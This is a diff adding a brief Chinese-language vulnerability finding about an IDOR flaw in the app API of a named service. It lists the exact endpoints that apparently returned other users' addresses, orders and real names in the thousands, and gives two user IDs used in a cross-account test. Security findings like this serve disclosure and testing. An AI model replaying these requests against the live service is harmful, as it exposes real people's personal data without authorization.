@@ -1,0 +1,7 @@
+# E2 App 端 {id} 详情接口 IDOR
+目标: https://zsapi.lejiqu.com/app/*
+实测: GET /app/HarvestAddressInfo/getAddress/{id} -> 268 条他人地址
+GET /app/UserPurchaseProductsInfo/userPurchaseProducts/{id} -> 7000 条他人订单
+GET /app/contractInfoQuery/{id} -> 7000/7000 返回真实姓名
+双账号交叉(uid 245984 / uid 13811): 12/12 与 20/20 均可读
+写操作 deleteAddress/defaultAddress 被归属校验拦截
